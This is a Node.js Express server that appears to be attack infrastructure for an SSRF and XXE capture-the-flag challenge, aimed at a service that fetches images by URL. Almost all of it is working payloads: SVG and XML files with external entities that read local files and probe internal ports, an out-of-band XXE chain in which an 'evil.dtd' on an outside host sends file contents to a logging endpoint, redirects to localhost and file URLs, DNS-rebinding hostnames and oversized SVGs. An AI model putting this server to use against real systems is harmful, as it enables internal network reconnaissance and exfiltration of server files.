const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Test endpoint to check if server is fetching
app.get('/test', (req, res) => {
  console.log('TEST REQUEST - Server is calling us!', {
    timestamp: new Date().toISOString(),
    headers: req.headers,
    ip: req.ip,
    userAgent: req.get('User-Agent')
  });
  res.json({ status: 'test', message: 'Server is fetching images' });
});

// 1. XXE Injection in SVG
// Internal endpoint discovery
// Timing-based SSRF detection
app.get('/timing-attack', (req, res) => {
  console.log('Timing attack requested - checking for internal services');
  
  const targets = [
    'http://localhost:8080',
    'http://127.0.0.1:8080', 
    'http://localhost:5000',
    'http://127.0.0.1:5000',
    'http://localhost:3000',
    'http://127.0.0.1:3000',
    'http://localhost:80',
    'http://127.0.0.1:80',
    'http://internal:8080',
    'http://backend:5000'
  ];

  const target = targets[Math.floor(Math.random() * targets.length)];
  console.log('Testing internal service at:', target);
  
  // This will hang if the internal service exists
  res.setHeader('Content-Type', 'image/svg+xml');
  res.send(`<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="${target}" width="100" height="100"/>
</svg>`);
});

// 2. Try DNS rebinding attack
app.get('/dns-rebind', (req, res) => {
  console.log('DNS rebinding attack');
  res.setHeader('Content-Type', 'image/svg+xml');
  res.send(`<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="http://localhost:8080.127.0.0.1.xip.io/flag" width="100" height="100"/>
  <image href="http://127.0.0.1.localhost.xip.io/flag" width="100" height="100"/>
</svg>`);
});

// 3. Try different content types that might be processed differently
app.get('/as-xml', (req, res) => {
  console.log('Serving as pure XML');
  res.setHeader('Content-Type', 'application/xml');
  res.send(`<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<data>&xxe;</data>`);
});

// 4. Try to exploit any image processing library vulnerabilities
app.get('/decompress-bomb', (req, res) => {
  console.log('Decompress bomb image');
  // This might trigger vulnerabilities in image processing libraries
  res.setHeader('Content-Type', 'image/svg+xml');
  res.send(`<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100000" height="100000">
  <image href="http://localhost:8080/flag" width="100000" height="100000"/>
</svg>`);
});
app.get('/malformed-svg', (req, res) => {
  console.log('Malformed SVG requested');
  // This SVG is intentionally malformed to cause processing errors
  const malformedSvg = `<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <image href="http://localhost:8080/flag" width="100" height="100"/>
  <broken-element that-will-cause-error="true"/>
  <rect width="100" height="100" fill="red"/>
</svg>`;
  res.setHeader('Content-Type', 'image/svg+xml');
  res.send(malformedSvg);
});
// Very large SVG to cause processing issues
app.get('/large-svg', (req, res) => {
  console.log('Large SVG requested');
  let largeSvg = '<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg" width="10000" height="10000">';
  
  // Add many elements to make SVG very large
  for (let i = 0; i < 1000; i++) {
    largeSvg += `<rect x="${i*10}" y="${i*10}" width="10" height="10" fill="rgb(${i%255},${i%255},${i%255})"/>`;
  }
  
  largeSvg += `<image href="http://localhost:8080/flag" width="100" height="100"/>`;
  largeSvg += '</svg>';
  
  res.setHeader('Content-Type', 'image/svg+xml');
  res.send(largeSvg);
});
// Try to force direct file reading
app.get('/direct-file-read', (req, res) => {
  console.log('Direct file read requested');
  // This might bypass some filters
  const payload = `<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///flag">
  <!ENTITY % dtd SYSTEM "http://ssrf-sbc4.onrender.com/evil.dtd">
%dtd;
]>
<data>&send;</data>`;
  
  res.setHeader('Content-Type', 'application/xml');
  res.send(payload);
});

// Evil DTD for OOB XXE
app.get('/evil.dtd', (req, res) => {
  console.log('Evil DTD requested');
  const evilDtd = `<!ENTITY % all "<!ENTITY send SYSTEM 'http://ssrf-sbc4.onrender.com/log?file=%file;'>">%all;`;
  res.setHeader('Content-Type', 'application/xml');
  res.send(evilDtd);
});
// Redirect to file protocol (might work if filters are weak)
app.get('/redirect-to-file', (req, res) => {
  console.log('Redirect to file requested');
  res.redirect('file:///flag');
});
// Valid image but with malicious metadata
app.get('/valid-image-but-malicious', (req, res) => {
  console.log('Valid but malicious image requested');
  // Base64 of a simple red dot PNG with malicious comment
  const maliciousPng = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==';
  res.setHeader('Content-Type', 'image/png');
  res.send(Buffer.from(maliciousPng, 'base64'));
});
app.get('/internal-discovery.svg', (req, res) => {
  console.log('Internal discovery SVG requested');
  const svgPayload = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY internal1 SYSTEM "http://localhost:8080/">
  <!ENTITY internal2 SYSTEM "http://127.0.0.1:8080/">
  <!ENTITY internal3 SYSTEM "http://localhost:5000/">
  <!ENTITY internal4 SYSTEM "http://127.0.0.1:5000/">
  <!ENTITY internal5 SYSTEM "http://localhost:80/">
  <!ENTITY internal6 SYSTEM "http://127.0.0.1:80/">
  <!ENTITY internal7 SYSTEM "http://localhost:3000/">
  <!ENTITY internal8 SYSTEM "http://127.0.0.1:3000/">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <rect width="100" height="100" fill="blue"/>
  <text x="10" y="10" font-size="3">
    &internal1;&internal2;&internal3;&internal4;&internal5;&internal6;&internal7;&internal8;
  </text>
</svg>`;
  res.setHeader('Content-Type', 'image/svg+xml');
  res.send(svgPayload);
});
// Admin endpoints
app.get('/admin-endpoints.svg', (req, res) => {
  console.log('Admin endpoints SVG requested');
  const svgPayload = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY admin1 SYSTEM "http://localhost:8080/admin">
  <!ENTITY admin2 SYSTEM "http://127.0.0.1:8080/admin">
  <!ENTITY admin3 SYSTEM "http://localhost:5000/admin">
  <!ENTITY admin4 SYSTEM "http://127.0.0.1:5000/admin">
  <!ENTITY admin5 SYSTEM "http://localhost:8080/flag">
  <!ENTITY admin6 SYSTEM "http://127.0.0.1:8080/flag">
  <!ENTITY admin7 SYSTEM "http://localhost:5000/flag">
  <!ENTITY admin8 SYSTEM "http://127.0.0.1:5000/flag">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <rect width="100" height="100" fill="green"/>
  <text x="10" y="10" font-size="3">
    &admin1;&admin2;&admin3;&admin4;&admin5;&admin6;&admin7;&admin8;
  </text>
</svg>`;
  res.setHeader('Content-Type', 'image/svg+xml');
  res.send(svgPayload);
});
app.get('/flag-locations.svg', (req, res) => {
  console.log('Flag locations SVG requested');
  const svgPayload = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY flag1 SYSTEM "file:///flag.txt">
  <!ENTITY flag2 SYSTEM "file:///flag">
  <!ENTITY flag3 SYSTEM "file:///app/flag.txt">
  <!ENTITY flag4 SYSTEM "file:///app/flag">
  <!ENTITY flag5 SYSTEM "file:///home/flag.txt">
  <!ENTITY flag6 SYSTEM "file:///etc/flag">
  <!ENTITY flag7 SYSTEM "file:///var/flag">
  <!ENTITY flag8 SYSTEM "file:///tmp/flag">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <rect width="100" height="100" fill="red"/>
  <text x="10" y="10" font-size="3">
    &flag1;&flag2;&flag3;&flag4;&flag5;&flag6;&flag7;&flag8;
  </text>
</svg>`;
  res.setHeader('Content-Type', 'image/svg+xml');
  res.send(svgPayload);
});
app.get('/xxe.svg', (req, res) => {
  console.log('XXE SVG requested');
  const svgPayload = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://localhost:8080/flag">
  <!ENTITY xxe2 SYSTEM "http://127.0.0.1:8080/flag">
  <!ENTITY xxe3 SYSTEM "http://localhost:5000/flag">
  <!ENTITY xxe4 SYSTEM "http://127.0.0.1:5000/flag">
  <!ENTITY xxe5 SYSTEM "file:///flag.txt">
  <!ENTITY xxe6 SYSTEM "file:///app/flag.txt">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <rect width="100" height="100" fill="red"/>
  <text x="10" y="20" font-size="4">&xxe;&xxe2;&xxe3;&xxe4;&xxe5;&xxe6;</text>
</svg>`;
  res.setHeader('Content-Type', 'image/svg+xml');
  res.send(svgPayload);
});

// 2. SVG with external image reference
app.get('/external-image.svg', (req, res) => {
  console.log('External image SVG requested');
  const svgPayload = `<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <image href="http://localhost:8080/flag" width="100" height="100"/>
  <rect width="100" height="100" fill="red" opacity="0.5"/>
</svg>`;
  res.setHeader('Content-Type', 'image/svg+xml');
  res.send(svgPayload);
});

// 3. Redirect to internal endpoints
app.get('/redirect-internal', (req, res) => {
  console.log('Redirect to internal requested');
  res.redirect('http://localhost:8080/flag');
});

app.get('/redirect-internal2', (req, res) => {
  console.log('Redirect to internal2 requested');
  res.redirect('http://127.0.0.1:8080/flag');
});

// 4. Protocol-based SSRF
app.get('/file-protocol.svg', (req, res) => {
  console.log('File protocol SVG requested');
  const svgPayload = `<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <image href="file:///flag.txt" width="100" height="100"/>
  <rect width="100" height="100" fill="blue" opacity="0.5"/>
</svg>`;
  res.setHeader('Content-Type', 'image/svg+xml');
  res.send(svgPayload);
});

// 5. DNS rebinding technique
app.get('/dns-rebind.svg', (req, res) => {
  console.log('DNS rebind SVG requested');
  const svgPayload = `<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <image href="http://localhost:8080/flag" width="100" height="100"/>
  <image href="http://127.0.0.1.xip.io/flag" width="100" height="100"/>
  <rect width="100" height="100" fill="green" opacity="0.5"/>
</svg>`;
  res.setHeader('Content-Type', 'image/svg+xml');
  res.send(svgPayload);
});

// Log endpoint
app.get('/log', (req, res) => {
  console.log('POTENTIAL FLAG DATA:', {
    timestamp: new Date().toISOString(),
    query: req.query,
    headers: req.headers,
    ip: req.ip
  });
  res.json({ status: 'logged', data: req.query });
});

// Main page with all options
app.get('/', (req, res) => {
  const baseUrl = `https://${req.get('host')}`;
  res.send(`
    <h1>SSRF Attack Endpoints</h1>
    <p>Use these URLs in your image_url parameter:</p>
    <ul>
      <li><strong>XXE Injection:</strong> ${baseUrl}/xxe.svg</li>
      <li><strong>External Image:</strong> ${baseUrl}/external-image.svg</li>
      <li><strong>Redirect Internal:</strong> ${baseUrl}/redirect-internal</li>
      <li><strong>Redirect Internal2:</strong> ${baseUrl}/redirect-internal2</li>
      <li><strong>File Protocol:</strong> ${baseUrl}/file-protocol.svg</li>
      <li><strong>DNS Rebind:</strong> ${baseUrl}/dns-rebind.svg</li>
      <li><strong>Test:</strong> ${baseUrl}/test</li>
    </ul>
  `);
});

app.listen(PORT, () => {
  console.log(`SSRF server running on port ${PORT}`);
  console.log('Try these endpoints in your attack:');
  console.log('1. /xxe.svg - XXE Injection');
  console.log('2. /external-image.svg - External image reference');
  console.log('3. /redirect-internal - Redirect to localhost');
  console.log('4. /file-protocol.svg - File protocol SSRF');
  console.log('5. /dns-rebind.svg - DNS rebinding');
  console.log('6. /test - Test if server is fetching');
});
